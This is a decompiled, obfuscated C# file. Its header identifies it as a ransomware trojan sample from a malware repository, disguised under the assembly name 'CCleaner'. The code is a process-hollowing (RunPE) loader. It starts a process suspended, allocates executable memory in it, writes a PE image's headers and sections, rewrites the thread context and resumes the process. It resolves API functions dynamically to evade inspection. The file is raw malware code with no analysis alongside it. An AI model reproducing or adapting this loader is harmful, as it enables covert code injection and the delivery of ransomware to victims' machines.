// Decompiled with JetBrains decompiler
// Type: XgbvJJWlXabVfSl.psUclhtsaSNIhcmmnPrAcwVuAmXnUg
// Assembly: CCleaner, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BD66A744-51D4-4263-B646-6D9E9FC651B3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-c9b14ca3708db4349bf39415bd719f77e4da416306df8a531bfc789deffbd41f.exe

using System;
using System.Runtime.InteropServices;

namespace XgbvJJWlXabVfSl
{
  public class psUclhtsaSNIhcmmnPrAcwVuAmXnUg
  {
    private const uint YzuodNrPUSTPxjqtdQTfJmhCKSwyBZ = 65543;
    private const int keyUTnoSYxUxVxGmZMegjhtOwLsRCl = 4;
    private const int rRnUHPrCpdgkRullrIWySJtuQdKJxh = 4096;
    private const int UvpNhdkaPRUvxbaYpYDluJVetGwSeE = 8192;
    private const int eGfhjJUenharSeDwmsuRNLgmMkzluA = 64;
    private const ushort FtVlNoqqSqdlLvkdRRzVtewnQszTuZ = 23117;
    private const uint kJJMAIvHrqgWzeNCaKbJtIKygBUHtt = 17744;

    public static unsafe bool \u0020(
      byte[] NwVTfsBYUBHkAkPxDtynsPRKGBZkFZ,
      string NNnWCIaGYubbPycihAIIYCjgbXEknD)
    {
      bSbevZcGNqxJlEpcoxyrEwvscmFmwx.DlPnsUWoRMyTibx dlPnsUwoRmyTibx = bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020<bSbevZcGNqxJlEpcoxyrEwvscmFmwx.DlPnsUWoRMyTibx>(bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[1], bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[3]);
      bSbevZcGNqxJlEpcoxyrEwvscmFmwx.AniEMDaIVBuctIX aniEmDaIvBuctIx = bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020<bSbevZcGNqxJlEpcoxyrEwvscmFmwx.AniEMDaIVBuctIX>(bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[2], bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[4]);
      bSbevZcGNqxJlEpcoxyrEwvscmFmwx.kVhzLyIRbXtCetc kVhzLyIrbXtCetc = bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020<bSbevZcGNqxJlEpcoxyrEwvscmFmwx.kVhzLyIRbXtCetc>(bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[1], bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[5]);
      bSbevZcGNqxJlEpcoxyrEwvscmFmwx.mNkQNttvOsSvgHt mNkQnttvOsSvgHt = bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020<bSbevZcGNqxJlEpcoxyrEwvscmFmwx.mNkQNttvOsSvgHt>(bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[1], bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[6]);
      bSbevZcGNqxJlEpcoxyrEwvscmFmwx.bWoSXjnhqcoGqNm bWoSxjnhqcoGqNm = bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020<bSbevZcGNqxJlEpcoxyrEwvscmFmwx.bWoSXjnhqcoGqNm>(bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[1], bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[7]);
      bSbevZcGNqxJlEpcoxyrEwvscmFmwx.FzQDKGtoFKlPaTz fzQdkGtoFklPaTz = bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020<bSbevZcGNqxJlEpcoxyrEwvscmFmwx.FzQDKGtoFKlPaTz>(bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[1], bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[8]);
      byte[] dst1 = new byte[40];
      byte[] dst2 = new byte[248];
      byte[] dst3 = new byte[64];
      int[] jaOhzYTaUCyDfaQSxWhfulElheWQBO = new int[4];
      byte[] numArray = new byte[716];
      fixed (byte* numPtr = &dst1[0])
        ;
      fixed (byte* numPtr = &dst2[0])
        ;
      fixed (byte* numPtr = &dst3[0])
        ;
      fixed (byte* JgIMbuXPnRRXGIX = &numArray[0])
        ;
      // ISSUE: fixed variable is out of scope
      *(int*) JgIMbuXPnRRXGIX = 65543;
      Buffer.BlockCopy((Array) NwVTfsBYUBHkAkPxDtynsPRKGBZkFZ, 0, (Array) dst3, 0, dst3.Length);
      // ISSUE: fixed variable is out of scope
      if (*(ushort*) numPtr != (ushort) 23117)
        return false;
      // ISSUE: fixed variable is out of scope
      int srcOffset = *(int*) (numPtr + 60);
      Buffer.BlockCopy((Array) NwVTfsBYUBHkAkPxDtynsPRKGBZkFZ, srcOffset, (Array) dst2, 0, dst2.Length);
      // ISSUE: fixed variable is out of scope
      if (*(uint*) numPtr != 17744U || !psUclhtsaSNIhcmmnPrAcwVuAmXnUg.CreateProcess((string) null, NNnWCIaGYubbPycihAIIYCjgbXEknD, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, (string) null, new byte[68], jaOhzYTaUCyDfaQSxWhfulElheWQBO))
        return false;
      // ISSUE: fixed variable is out of scope
      IntPtr num1 = new IntPtr(*(int*) (numPtr + 52));
      int num2 = (int) kVhzLyIrbXtCetc((IntPtr) jaOhzYTaUCyDfaQSxWhfulElheWQBO[0], num1);
      // ISSUE: fixed variable is out of scope
      if (aniEmDaIvBuctIx((IntPtr) jaOhzYTaUCyDfaQSxWhfulElheWQBO[0], num1, *(uint*) (numPtr + 80), 12288U, 64U) == IntPtr.Zero)
        psUclhtsaSNIhcmmnPrAcwVuAmXnUg.\u0020(NwVTfsBYUBHkAkPxDtynsPRKGBZkFZ, NNnWCIaGYubbPycihAIIYCjgbXEknD);
      fixed (byte* lqeZQdevuZGsqdn = &NwVTfsBYUBHkAkPxDtynsPRKGBZkFZ[0])
      {
        // ISSUE: fixed variable is out of scope
        int num3 = dlPnsUwoRmyTibx((IntPtr) jaOhzYTaUCyDfaQSxWhfulElheWQBO[0], num1, (IntPtr) (void*) lqeZQdevuZGsqdn, *(uint*) (numPtr + 84), IntPtr.Zero);
      }
      // ISSUE: fixed variable is out of scope
      for (ushort index = 0; (int) index < (int) *(ushort*) (numPtr + 6); ++index)
      {
        Buffer.BlockCopy((Array) NwVTfsBYUBHkAkPxDtynsPRKGBZkFZ, srcOffset + dst2.Length + dst1.Length * (int) index, (Array) dst1, 0, dst1.Length);
        // ISSUE: fixed variable is out of scope
        fixed (byte* lqeZQdevuZGsqdn = &NwVTfsBYUBHkAkPxDtynsPRKGBZkFZ[(IntPtr) *(uint*) (numPtr + 20)])
        {
          // ISSUE: fixed variable is out of scope
          // ISSUE: fixed variable is out of scope
          int num4 = dlPnsUwoRmyTibx((IntPtr) jaOhzYTaUCyDfaQSxWhfulElheWQBO[0], (IntPtr) ((long) (int) num1 + (long) *(uint*) (numPtr + 12)), (IntPtr) (void*) lqeZQdevuZGsqdn, *(uint*) (numPtr + 16), IntPtr.Zero);
        }
      }
      // ISSUE: fixed variable is out of scope
      int num5 = mNkQnttvOsSvgHt((IntPtr) jaOhzYTaUCyDfaQSxWhfulElheWQBO[1], (IntPtr) (void*) JgIMbuXPnRRXGIX);
      // ISSUE: fixed variable is out of scope
      int num6 = dlPnsUwoRmyTibx((IntPtr) jaOhzYTaUCyDfaQSxWhfulElheWQBO[0], (IntPtr) (long) *(uint*) (JgIMbuXPnRRXGIX + 172), num1, 4U, IntPtr.Zero);
      // ISSUE: fixed variable is out of scope
      // ISSUE: fixed variable is out of scope
      *(int*) (JgIMbuXPnRRXGIX + 176) = (int) num1 + (int) *(uint*) (numPtr + 40);
      // ISSUE: fixed variable is out of scope
      int num7 = bWoSxjnhqcoGqNm((IntPtr) jaOhzYTaUCyDfaQSxWhfulElheWQBO[1], (IntPtr) (void*) JgIMbuXPnRRXGIX);
      int num8 = (int) fzQdkGtoFklPaTz((IntPtr) jaOhzYTaUCyDfaQSxWhfulElheWQBO[1], IntPtr.Zero);
      return true;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CreateProcess(
      string trsVOTWDGhwWsemrZtIxtyAXakDgUE,
      string dQtuaKIUKimCTBlbjfUKXnAPjVPuVD,
      IntPtr pPIbdGCYdAHfHAlQEYLYbymkHQpDlf,
      IntPtr UnYgSwUSxExkbscREaDsrRJWBQDxtn,
      bool rYMXGugBIOWLAhzQxTiPlpZSOdDcDc,
      uint SvylnyxdLHKdtPvEqBvLtKqDbcZUjD,
      IntPtr QeXFVAnqTasthAfiXkvjMbGSJifUjl,
      string zCUiQGfLTVraIutYCPyTeOxZROwfWM,
      byte[] usgIzPzZJxclqASLslzKFqvqgLfUqc,
      int[] jaOhzYTaUCyDfaQSxWhfulElheWQBO);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibraryA(string JEIGobvjaTRsrWmbkuynoiNlGXvDZv);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(
      IntPtr bdxgSTVxLOvoWonbUIZfUBroAARwZr,
      string FSjEROVldtgMIJRZmzXFdNEUByLkFr);
  }
}
